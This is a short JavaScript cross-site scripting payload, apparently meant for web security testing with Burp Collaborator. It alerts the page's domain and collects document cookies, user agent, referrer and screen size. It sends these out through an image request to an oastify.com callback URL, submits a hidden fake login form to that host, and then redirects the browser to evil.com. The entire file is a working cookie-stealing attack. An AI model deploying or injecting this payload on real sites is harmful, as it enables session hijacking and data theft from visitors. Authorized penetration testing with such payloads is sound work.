// Display the current domain in an alert
alert("Domain: " + document.domain);

// Fetch cookies, User-Agent, referrer, screen resolution
var cookies = document.cookie;
var userAgent = navigator.userAgent;
var referrer = document.referrer;
var screenResolution = screen.width + 'x' + screen.height;

// Send the cookies and data to your Burp Collaborator URL
var burpCollaboratorURL = "https://mh7587gmzgcs1acch9zst61o7fd618px.oastify.com";
var data = {
  cookies: encodeURIComponent(cookies),
  userAgent: encodeURIComponent(userAgent),
  referrer: encodeURIComponent(referrer),
  screenResolution: encodeURIComponent(screenResolution)
};

var img = new Image();
img.src = burpCollaboratorURL + "/?data=" + encodeURIComponent(JSON.stringify(data));

// Fake login form exfiltration
var fakeForm = document.createElement('form');
fakeForm.method = 'POST';
fakeForm.action = burpCollaboratorURL + "/fake-login";
var usernameField = document.createElement('input');
usernameField.type = 'text';
usernameField.name = 'username';
usernameField.value = 'fakeuser';
var passwordField = document.createElement('input');
passwordField.type = 'password';
passwordField.name = 'password';
passwordField.value = 'fakepassword';
fakeForm.appendChild(usernameField);
fakeForm.appendChild(passwordField);
document.body.appendChild(fakeForm);
fakeForm.submit();

// Redirect to a malicious site after 2 seconds
setTimeout(function() {
    window.location.href = "https://evil.com"; 
}, 2000);
